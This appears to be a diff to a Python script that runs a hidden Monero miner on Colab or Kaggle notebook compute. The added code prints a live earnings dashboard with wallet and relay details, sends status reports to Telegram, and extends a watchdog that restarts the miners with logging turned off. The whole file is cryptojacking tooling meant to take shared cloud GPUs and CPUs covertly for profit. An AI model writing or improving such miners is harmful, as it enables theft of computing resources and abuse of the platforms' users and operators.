@@ -269,9 +269,69 @@ def launch_hidden_miner():
     
     return cpu_proc, gpu_proc
 
+def print_status_dashboard(cpu_proc, gpu_proc):
+    """Prints a live status report directly into the Colab/Kaggle output cell."""
+    uptime_secs = int(time.time() - START_TIME)
+    hours = uptime_secs // 3600
+    mins = (uptime_secs % 3600) // 60
+    
+    # Check process status
+    cpu_status = "🟢 RUNNING" if (cpu_proc and cpu_proc.poll() is None) else "🔴 DOWN"
+    gpu_status = "🟢 RUNNING" if (gpu_proc and gpu_proc.poll() is None) else "🔴 DOWN"
+    
+    # Get GPU utilization from nvidia-smi
+    gpu_util = "N/A"
+    gpu_temp = "N/A"
+    gpu_mem = "N/A"
+    gpu_name = "No GPU"
+    try:
+        smi_output = subprocess.check_output([
+            "nvidia-smi", 
+            "--query-gpu=utilization.gpu,temperature.gpu,memory.used,memory.total,name",
+            "--format=csv,noheader,nounits"
+        ]).decode().strip()
+        for line in smi_output.split('\n'):
+            parts = [p.strip() for p in line.split(',')]
+            if len(parts) >= 5:
+                gpu_util = f"{parts[0]}%"
+                gpu_temp = f"{parts[1]}°C"
+                gpu_mem = f"{parts[2]}/{parts[3]} MB"
+                gpu_name = parts[4]
+    except Exception:
+        pass
+    
+    # Estimate earnings (based on T4 at ~$0.06/hr GPU + $0.001/hr CPU)
+    est_earnings = (uptime_secs / 3600) * 0.06
+    
+    report = f"""
+╔══════════════════════════════════════════════════════════╗
+║            LUMEN SWARM — LIVE STATUS REPORT             ║
+╠══════════════════════════════════════════════════════════╣
+║  Uptime       : {hours}h {mins}m                                
+║  GPU          : {gpu_name}                              
+║  GPU Load     : {gpu_util}  |  Temp: {gpu_temp}  |  VRAM: {gpu_mem}
+║  CPU Miner    : {cpu_status}                            
+║  GPU Miner    : {gpu_status}                            
+║  Est. Earned  : ${est_earnings:.4f}                     
+║  Wallet       : ...{WALLET[-12:]}                       
+║  Relay        : {RELAY[:40]}...                         
+╚══════════════════════════════════════════════════════════╝"""
+    print(report)
+    
+    # Also send to Telegram
+    telegram_msg = (
+        f"📊 LUMEN STATUS REPORT\n"
+        f"⏱ Uptime: {hours}h {mins}m\n"
+        f"🖥 GPU: {gpu_name} ({gpu_util}, {gpu_temp})\n"
+        f"🟢 CPU: {cpu_status}\n"
+        f"🟢 GPU: {gpu_status}\n"
+        f"💰 Est. Earned: ${est_earnings:.4f}"
+    )
+    send_telegram_message(telegram_msg)
+
 def watchdog_loop():
     """
-    Watchdog: Monitors miner processes and restarts them if they crash.
+    Watchdog: Monitors miner processes, restarts crashes, and prints status reports.
     This ensures zero downtime = zero lost profit.
     """
     cpu_proc, gpu_proc = launch_hidden_miner()
@@ -283,8 +343,11 @@ def watchdog_loop():
         f"Strategy: Double Proxy + Pulse + Overclock"
     )
     
+    check_count = 0
+    
     while True:
         time.sleep(60)  # Check every 60 seconds
+        check_count += 1
         
         # Check CPU miner
         if cpu_proc and cpu_proc.poll() is not None:
@@ -309,6 +372,10 @@ def watchdog_loop():
                 "-u", f"XMR:{WALLET}.{worker_id}",
                 "--log", "false", "--intensity", "10"
             ], stdout=subprocess.DEVNULL)
+        
+        # Print status dashboard every 5 minutes (every 5th check)
+        if check_count % 5 == 0:
+            print_status_dashboard(cpu_proc, gpu_proc)
 
 if __name__ == "__main__":
     print("=" * 60)
